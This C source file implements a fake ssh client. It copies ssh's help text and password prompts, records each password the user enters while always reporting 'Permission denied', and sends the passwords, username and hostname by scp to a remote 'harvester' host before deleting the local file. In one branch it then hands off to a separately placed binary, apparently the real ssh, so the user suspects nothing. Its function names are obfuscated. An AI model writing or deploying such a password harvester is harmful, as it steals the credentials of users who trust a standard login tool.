#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
/*
    Program structure:
    - main: The spine that calls all of the other functions
        - helppage: immitation of the ssh help page.
    - goodbean: 
    - badbean: 
If no host exists -> ssh: connect to host 192.168.14.135 port 22: Connection refused
If host exists-> testadmin@192.168.15.135's password: 
Permission denied, please try again.
testadmin@192.168.15.135's password: 
Permission denied, please try again.
testadmin@192.168.15.135's password: 
testadmin@192.168.15.135: Permission denied (publickey,password).
*/
void dPZ4TGh6(char *filename, struct passwd *p, char *passlist[], int rounds, char *date){//sshsession
    char hostname[100];
    gethostname(hostname, 100);
    FILE *fp;
    fp = fopen(filename, "w");
    for(int i = 0; i < rounds; i++){
        fprintf(fp, "%s@%s: %s entered the passphrase: %s at %s\n", p->pw_name, hostname, p->pw_name, passlist[i], date);
    }
    fclose(fp);
    char command[50] = "/usr/bin/scp -q '";
    //char dest[100] = "' harvester@localhost:/var/harvester";
    char dest[100] = "' pdiddy@172.16.77.5:/var/harvester";
    strcat(command, filename);
    strcat(command, dest);
    system(command);
    strcpy(command, "/bin/rm '"); //must be quoted
    strcat(command, filename);
    strcat(command, "'");
    system(command);
}
void gKfu9bKo(int rounds, char *argv[], int argc, int condition){//goodbean
    char argument[100];
    for (int i = 1; i < argc; i++){
        strcat(argument, argv[i]);
        strcat(argument, " ");
    }
    int attempts = 0;
    struct passwd *p = getpwuid(getuid()); // Check for null
    char *passlist[rounds];
    char pass[100] = "";
    char date[250] = "";
    char prompt[200];

    //Creating time and the filename
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    sprintf(date, "%d-%02d-%02d==%02d:%02d:%02d", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
    char filename[100] = "/dev/shm/bigbrother-(";
    strcat(filename, date);
    strcat(filename,").har");
    strcpy(prompt, argv[1]);
    strcat(prompt, "'s password:  ");
    while(attempts < rounds){

        strcpy(pass, getpass(prompt));
        passlist[attempts] = pass;
        sleep(2);
        printf("Permission denied, please try again.\n");
        attempts = attempts + 1;
    }
    dPZ4TGh6(filename, p, passlist, rounds, date);
    char command[100] = "/usr/bin/dev/colterm";
    strcat(command, " ");
    strcat(command, argument);
    system(command);
}
void bT5fKTZP(int rounds, char *argv[]){//badbean
        int attempts = 0;
    struct passwd *p = getpwuid(getuid()); // Check for null
    char pass[100] = "";
    char date[250] = "";
    char prompt[200];
    char *passlist[rounds];
    //Creating time and the filename
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    sprintf(date, "%d-%02d-%02d==%02d:%02d:%02d", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
    char filename[100] = "/dev/shm/bigbrother-(";
    strcat(filename, date);
    strcat(filename,").har");
    strcpy(prompt, argv[1]);
    strcat(prompt, "'s password:  ");
    while(attempts < rounds){
        strcpy(pass, getpass(prompt));
        passlist[attempts] = pass;
        sleep(2);
        printf("Permission denied, please try again.\n");
        attempts = attempts + 1;
    }
    strcpy(pass, getpass(prompt));
    printf("Permission denied (publickey,password).\n");
    dPZ4TGh6(filename, p, passlist, rounds, date);
}
void helppage(){
    char *sshhelp = "usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]\n"
    "\t   [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]\n"
    "\t   [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]\n"
    "\t   [-i identity_file] [-J [user@]host[:port]] [-L address]\n"
    "\t   [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]\n"
    "\t   [-Q query_option] [-R address] [-S ctl_path] [-W host:port]\n"
    "\t   [-w local_tun[:remote_tun]] destination [command]\n";
    printf("%s", sshhelp);
}
int main(int argc, char *argv[]){
    if (argc == 1){
        helppage();
        exit(0);
    }
    time_t t; 
    srand( (unsigned) time(&t));
    int condition = rand() % 3;
    int rounds = (rand() % 3) + 2;
    if (condition == 0){
        bT5fKTZP(rounds, argv);
    }
    else {
        int rounds = 2;
        gKfu9bKo(rounds, argv, argc, condition);
    }
    return 0;
}
